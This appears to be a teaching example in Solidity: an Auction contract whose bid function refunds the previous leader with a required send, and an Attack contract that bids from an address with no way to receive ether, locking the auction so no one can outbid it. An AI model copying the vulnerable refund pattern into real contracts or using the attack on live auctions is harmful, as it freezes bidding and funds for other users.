// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract Auction {
  address public currentLeader;
  uint public highestBid;
  
  function bid() external payable
  {
      require(msg.value > highestBid,"can not bid with amount less than previous leader");

      require(payable(currentLeader).send(highestBid));

      currentLeader = msg.sender;
      highestBid = msg.value;
  }
}

contract Attack
{
  function attack( Auction auction ) public payable {
    auction.bid{value: msg.value}();
  }
}


